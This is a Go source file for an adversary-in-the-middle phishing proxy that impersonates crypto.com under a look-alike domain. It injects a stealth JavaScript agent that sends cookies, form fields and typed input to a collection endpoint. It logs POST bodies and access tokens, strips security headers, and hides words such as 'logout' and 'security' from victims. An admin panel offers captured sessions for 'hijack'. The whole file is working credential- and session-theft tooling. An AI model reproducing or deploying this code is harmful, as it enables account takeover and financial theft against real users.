package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/net/html"
	"github.com/FritzHeider/ultprox/internal/proxy"
)

const (
	targetURL       = "https://crypto.com"
	fakeDomain      = "luminaryfinances.com"
	proxyPort       = ":443"
	certFile        = "certs/cert.pem"
	keyFile         = "certs/key.pem"
	sessionDB       = "db/sessions.db"
	adminPort       = ":8081"
	jsAgent         = "static/agent.js"
	sessionLifetime = 24 * time.Hour
)

var (
	logFile        *os.File
	logMutex       sync.Mutex
	db             *sql.DB
	sessionManager *proxy.SessionManager
	blockedKeywords = []string{"logout", "security", "report"}
)

func main() {
	if err := initAll(); err != nil {
		log.Fatalf("Initialization failed: %v", err)
	}
	defer cleanup()

	log.Printf("Starting MITM Proxy on %s%s", fakeDomain, proxyPort)

	target, _ := url.Parse(targetURL)
	proxy := createReverseProxy(target)
	server := createHTTPServer(proxy)

	log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
}

/* Initialization Functions */

func initAll() error {
	if err := initLogger(); err != nil {
		return fmt.Errorf("logger initialization failed: %w", err)
	}
	if err := initDatabase(); err != nil {
		return fmt.Errorf("database initialization failed: %w", err)
	}
	if err := initStaticAssets(); err != nil {
		return fmt.Errorf("static assets initialization failed: %w", err)
	}

	sessionManager = proxy.NewSessionManager(db, log.Default())
	go startAdminPanel()
	go cleanOldSessionsPeriodically()
	return nil
}

func initLogger() error {
	if err := os.MkdirAll("logs", 0755); err != nil {
		return err
	}
	var err error
	logFile, err = os.OpenFile("logs/captured.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	return err
}

func initDatabase() error {
	if err := os.MkdirAll("db", 0755); err != nil {
		return err
	}
	var err error
	db, err = sql.Open("sqlite3", sessionDB)
	if err != nil {
		return err
	}
	
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY,
		cookies TEXT,
		user_agent TEXT,
		ip TEXT,
		last_active TIMESTAMP,
		metadata TEXT
	)`)
	return err
}

func initStaticAssets() error {
	if err := os.MkdirAll("static", 0755); err != nil {
		return err
	}
	return os.WriteFile(jsAgent, []byte(getEnhancedAgentJS()), 0644)
}

/* Core Proxy Functions */

func createReverseProxy(target *url.URL) *httputil.ReverseProxy {
	return &httputil.ReverseProxy{
		Director:       createDirector(target),
		ModifyResponse: createResponseModifier(),
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
			MaxIdleConns:        100,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}
}

func createHTTPServer(handler http.Handler) *http.Server {
	return &http.Server{
		Addr:    proxyPort,
		Handler: handler,
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			PreferServerCipherSuites: true,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
			},
		},
	}
}

/* Request/Response Handling */

func createDirector(target *url.URL) func(*http.Request) {
	return func(req *http.Request) {
		sessionID := getOrCreateSessionID(req)
		updateSession(sessionID, req)

		// Proxy request modifications
		req.Header.Set("X-Forwarded-Host", req.Host)
		req.Host = target.Host
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host

		removeSecurityHeaders(req)
		logRequestData(sessionID, req)
	}
}

func createResponseModifier() func(*http.Response) error {
	return func(resp *http.Response) error {
		if isJSONResponse(resp) {
			return handleJSONResponse(resp)
		}

		if !isHTMLResponse(resp) {
			return nil
		}

		modifiedBody, err := modifyHTMLResponse(resp)
		if err != nil {
			return err
		}

		resp.Body = io.NopCloser(bytes.NewReader(modifiedBody))
		resp.Header.Set("Content-Length", fmt.Sprint(len(modifiedBody)))
		return nil
	}
}

func modifyHTMLResponse(resp *http.Response) ([]byte, error) {
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	resp.Body.Close()

	modifiedBody := body
	modifiedBody = replaceAllDomains(modifiedBody)
	modifiedBody = injectAgentScript(modifiedBody, resp.Request)
	modifiedBody = blockSensitiveContent(modifiedBody)
	modifiedBody = bindSession(modifiedBody, resp.Request)

	removeSecurityHeadersFromResponse(resp)
	return modifiedBody, nil
}

/* JavaScript Injection */

func injectAgentScript(body []byte, req *http.Request) []byte {
	sessionID := getSessionID(req)
	if sessionID == "" {
		return body
	}

	doc, err := html.Parse(bytes.NewReader(body))
	if err != nil {
		return body
	}

	// Create script node with all attributes
	scriptNode := &html.Node{
		Type: html.ElementNode,
		Data: "script",
		Attr: []html.Attribute{
			{Key: "src", Val: "/" + jsAgent},
			{Key: "data-session-id", Val: sessionID},
			{Key: "data-stealth", Val: "7"},
			{Key: "async", Val: "true"},
		},
	}

	// Find head tag and inject our script
	var injector func(*html.Node)
	injector = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "head" {
			n.AppendChild(scriptNode)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			injector(c)
		}
	}
	injector(doc)

	var buf bytes.Buffer
	html.Render(&buf, doc)
	return buf.Bytes()
}

func getEnhancedAgentJS() string {
	return `// Ultimate Client-Side Monitoring Agent
(function() {
    const config = {
        sessionId: document.currentScript.getAttribute('data-session-id'),
        stealthLevel: parseInt(document.currentScript.getAttribute('data-stealth')) || 7,
        endpoint: '/collect'
    };

    // Stealthy data collection
    function collect(type, data) {
        if (config.stealthLevel > 5) {
            // Use image beacon for maximum stealth
            new Image().src = config.endpoint + '?t=' + type + 
                '&d=' + encodeURIComponent(JSON.stringify(data)) + 
                '&sid=' + config.sessionId + '&_' + Date.now();
        } else {
            // Use fetch when stealth isn't critical
            fetch(config.endpoint, {
                method: 'POST',
                body: JSON.stringify({
                    type: type,
                    data: data,
                    session_id: config.sessionId
                }),
                keepalive: true
            }).catch(() => {});
        }
    }

    // Initialize monitoring
    function init() {
        // Initial data collection
        collect('init', {
            url: location.href,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        });

        // Form monitoring
        document.addEventListener('submit', function(e) {
            const formData = {};
            Array.from(e.target.elements).forEach(el => {
                if (el.name) formData[el.name] = el.value;
            });
            collect('form', {
                action: e.target.action,
                method: e.target.method,
                data: formData
            });
        }, true);

        // Input monitoring
        document.addEventListener('change', function(e) {
            if (e.target.name) {
                collect('input', {
                    name: e.target.name,
                    value: e.target.value,
                    type: e.target.type
                });
            }
        });

        // Heartbeat
        setInterval(() => {
            collect('heartbeat', {
                url: location.href,
                cookies: document.cookie
            });
        }, 30000);
    }

    // Start when DOM is ready
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }
})();`
}

func removeSecurityHeaders(req *http.Request) {
	headers := []string{
		"Origin",
		"Referer",
		"X-CSRF-Token",
		"X-Requested-With",
	}
	for _, h := range headers {
		req.Header.Del(h)
	}
}

func removeSecurityHeadersFromResponse(resp *http.Response) {
	headers := []string{
		"Content-Security-Policy",
		"X-Frame-Options",
		"Strict-Transport-Security",
	}
	for _, h := range headers {
		resp.Header.Del(h)
	}
}

/* Session Management */

func getOrCreateSessionID(req *http.Request) string {
	if id := getSessionID(req); id != "" {
		return id
	}
	return generateSessionID()
}

func getSessionID(req *http.Request) string {
	if cookie, err := req.Cookie("session_id"); err == nil {
		return cookie.Value
	}
	return ""
}

func generateSessionID() string {
	return fmt.Sprintf("%x", time.Now().UnixNano())
}

func updateSession(sessionID string, req *http.Request) {
	if sessionID == "" {
		return
	}

	session := proxy.Session{
		ID:         sessionID,
		IP:         proxy.GetClientIP(req),
		UserAgent:  req.UserAgent(),
		LastActive: time.Now(),
	}

	if cookies := req.Header.Get("Cookie"); cookies != "" {
		session.Cookies = cookies
	}

	if err := sessionManager.Save(context.Background(), session); err != nil {
		log.Printf("Error saving session: %v", err)
	}
}

func cleanOldSessionsPeriodically() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		if _, err := sessionManager.CleanOld(context.Background(), sessionLifetime); err != nil {
			log.Printf("Error cleaning old sessions: %v", err)
		}
	}
}

/* Content Manipulation */

func replaceAllDomains(body []byte) []byte {
	patterns := []struct {
		old string
		new string
	}{
		{targetURL, "https://" + fakeDomain},
		{"crypto.com", fakeDomain},
		{strings.Replace(targetURL, "https://", "", 1), fakeDomain},
	}
	
	for _, p := range patterns {
		body = bytes.ReplaceAll(body, []byte(p.old), []byte(p.new))
	}
	return body
}

func blockSensitiveContent(body []byte) []byte {
	for _, keyword := range blockedKeywords {
		if bytes.Contains(body, []byte(keyword)) {
			re := regexp.MustCompile(`(?i)` + regexp.QuoteMeta(keyword))
			body = re.ReplaceAll(body, []byte("[redacted]"))
		}
	}
	return body
}

func bindSession(body []byte, req *http.Request) []byte {
	sessionID := getSessionID(req)
	if sessionID == "" {
		return body
	}
	
	script := fmt.Sprintf(`<script nonce="%x">sessionStorage.setItem('session_id','%s')</script>`,
		generateNonce(), sessionID)
	return bytes.Replace(body, []byte("</body>"), append([]byte(script), []byte("</body>")...), 1)
}

func generateNonce() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

/* Utility Functions */

func isJSONResponse(resp *http.Response) bool {
	return strings.Contains(resp.Header.Get("Content-Type"), "application/json")
}

func isHTMLResponse(resp *http.Response) bool {
	return strings.Contains(resp.Header.Get("Content-Type"), "text/html")
}

func handleJSONResponse(resp *http.Response) error {
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	resp.Body.Close()

	var jsonData map[string]interface{}
	if err := json.Unmarshal(body, &jsonData); err == nil {
		if token, exists := jsonData["access_token"]; exists {
			logSessionData("ACCESS_TOKEN", fmt.Sprintf("%v", token))
		}
	}

	resp.Body = io.NopCloser(bytes.NewReader(body))
	return nil
}

func logRequestData(sessionID string, req *http.Request) {
	data := fmt.Sprintf("[%s] %s %s\nSession: %s\nIP: %s\nUA: %s\n",
		time.Now().Format(time.RFC3339Nano),
		req.Method,
		req.URL.String(),
		sessionID,
		proxy.GetClientIP(req),
		req.UserAgent())

	if req.Method == "POST" {
		body, _ := io.ReadAll(req.Body)
		req.Body = io.NopCloser(bytes.NewReader(body))
		data += fmt.Sprintf("Body: %s\n", string(body))
	}

	writeLog(data)
}

func logSessionData(key, value string) {
	writeLog(fmt.Sprintf("[%s] %s: %s\n",
		time.Now().Format(time.RFC3339Nano), key, value))
}

func writeLog(data string) {
	logMutex.Lock()
	defer logMutex.Unlock()
	logFile.WriteString(data)
}

/* Admin Panel */

func startAdminPanel() {
    http.HandleFunc("/", adminUIHandler)
    http.HandleFunc("/sessions", enableCORS(listSessionsHandler))
    http.HandleFunc("/hijack", enableCORS(hijackSessionHandler))
    
    log.Printf("Admin panel running on http://localhost%s", adminPort)
    log.Fatal(http.ListenAndServe(adminPort, nil))
}
// Enable CORS middleware
func enableCORS(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Access-Control-Allow-Origin", "*")
        w.Header().Set("Access-Control-Allow-Methods", "GET")
        next(w, r)
    }
}

func listSessionsHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    sessions, err := sessionManager.GetAll(context.Background())
    if err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }
    json.NewEncoder(w).Encode(sessions)
}

func adminUIHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "text/html")
    fmt.Fprintf(w, `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ultprox Admin</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            tr:nth-child(even) { background-color: #f9f9f9; }
        </style>
    </head>
    <body>
        <h1>Active Sessions</h1>
        <div id="sessions"></div>
        
        <script>
            async function loadSessions() {
                try {
                    const response = await fetch('/sessions');
                    const sessions = await response.json();
                    
                    let html = '<table><tr><th>ID</th><th>IP</th><th>User Agent</th><th>Last Active</th><th>Actions</th></tr>';
                    
                    for (const id in sessions) {
                        const s = sessions[id];
                        html += \`
                        <tr>
                            <td>\${s.id}</td>
                            <td>\${s.ip}</td>
                            <td>\${s.user_agent}</td>
                            <td>\${new Date(s.last_active).toLocaleString()}</td>
                            <td><a href="/hijack?id=\${s.id}" target="_blank">Hijack</a></td>
                        </tr>\`;
                    }
                    
                    html += '</table>';
                    document.getElementById('sessions').innerHTML = html;
                } catch (error) {
                    console.error('Error loading sessions:', error);
                }
            }
            
            // Load immediately and every 5 seconds
            loadSessions();
            setInterval(loadSessions, 5000);
        </script>
    </body>
    </html>
    `)
}

// Updated hijackSessionHandler
func hijackSessionHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    sessionID := r.URL.Query().Get("id")
    session, err := sessionManager.GetByID(context.Background(), sessionID)
    if err != nil {
        http.Error(w, `{"error":"session not found"}`, http.StatusNotFound)
        return
    }
    json.NewEncoder(w).Encode(session)
}

/* Cleanup */

func cleanup() {
	logFile.Close()
	db.Close()
}